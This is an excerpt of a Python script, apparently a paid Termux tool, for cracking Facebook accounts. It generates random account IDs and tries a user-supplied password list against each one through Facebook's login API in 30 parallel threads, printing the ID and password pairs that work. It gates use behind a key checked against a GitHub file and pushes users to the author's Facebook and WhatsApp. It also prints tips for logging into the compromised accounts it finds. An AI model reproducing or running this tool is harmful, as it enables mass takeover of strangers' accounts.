...
def helpnote():
    print(
        "%s [=>] DO YOU GET OTHER FREE COMMAND IF GET TO MESSEGE IN MY FACEBOOK  :)" % (G))
    # yahan nichy httsp sy hata kr apna github aproval link dalna
    subprocess.check_output(
        ["am", "start", "https://github.com/ShoyibRatul/tex/blob/approved.txt"])
    # yahan apni facebook id link dalna
    exit(" [=>] FACEBOOK :  https://www.facebook.com/itzbeluga ")
...
def notice():
    ...
    runtxt(
        "\033[0;97m Do You Need Approval If Need Approval to Messege Me In Whatsapp ")
    os.system("xdg-open https://wa.me/+8801990953195?text=")
    subprocess.check_output(
        ["am", "start", "https://wa.me/+8801990953195?text="])
...
base4 = (basex3).upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace(
    'E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')
...
class Main:
    def __init__(self):
        ...
        try:
            ...
            plr = requests.get(
                'https://github.com/ShoyibRatul/tex/blob/approved.txt').text
            if basesplit in plr:
                key = basesplit
...
───────────────────────────────────────────────────────× 
    """)
        ...
        print("───────────────────────────────────────────────────────× ")
        print(
            " \t\033[1;97m[\x1b[1;97m\x1b[1;41m ADD MY FB ID FIRST\x1b[0m\x1b[1;97m] \033[1;37m ")
        subprocess.check_output(
            ["am", "start", "https://www.facebook.com/itzbeluga"])
        print("───────────────────────────────────────────────────────× ")
        print(
            "%s [%s1%s]%s CRACK RANDOM FB ID 2009-11 {JUST NOW} %s(paid.tools)" % (G, R, G, Y, B))
...
# yahan nichy kch cherna ni just name chnge krna
    ...
    def fbtua(self):
        ...
        idx = "1000000"
        limit = int(
            input("    \033[0;97m[=>]\033[0;97m TYPE 10000 (LIMIT 50000): "))
        try:
            ...
            print("\033[0;97m [=>] TOTAL ID -> \033[0;97m%s\033[0;97m" %
                  (len(self.id)))
            os.system("clear")
            logo2()
            with ThreadPoolExecutor(max_workers=30) as coeg:
                ...
                listpass = input(
                    "%s [=>] TYPE (123456,123456789) :%s " % (Y, G))
                print("───────────────────────────────────────────────────────× ")
                if len(listpass) <= 5:
                    exit("\n%s [=>] PASSWORD MINIMUM 6 CHARACTERS" % (R))
                print(
                    "%s [=>] CRACK WITH PASSWORD -> [\033[0;97m%s\033[0;97m]" % (Y, listpass))
                os.system("clear")
                logo2()
                print("───────────────────────────────────────────────────────× ")
                print(
                    "\033[0;92m[=×>]\033[0;92m NOTE : BEFORE LOG IN CP ID CLEAR YOUR FACEBOOK APP DATA ")
                print(
                    "\033[0;92m[=×>]\033[0;92m NOTE : TRY TO LOG IN CP ID AFTER 15 DAYS ")
                print("\033[0;92m[=×>]\033[0;92m NOTE : ENJOY PAID TOOL")
                print(
                    "\033[0;92m[=×>]\033[0;92m NOTE : TURN ON AIRPLANE MODE AFTER 10 SECOND ")
                print(
                    "\033[0;97m───────────────────────────────────────────────────────× ")
                for user in self.id:
    ...
    def api(self, uid, pwx):
        ...
        for pw in pwx:
            ...
            response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(
            ...
            if "session_key" in response.text and "EAAA" in response.text:
                print(
                    "\r  \033[0;97m   [=Twoaha=OK=>] %s | %s\033[0;97m         " % (uid, pw))
                ...
                print(
                    "\r  \033[0;92m   [=Twoaha=OK=>] %s | %s\033[0;97m         " % (uid, pw))
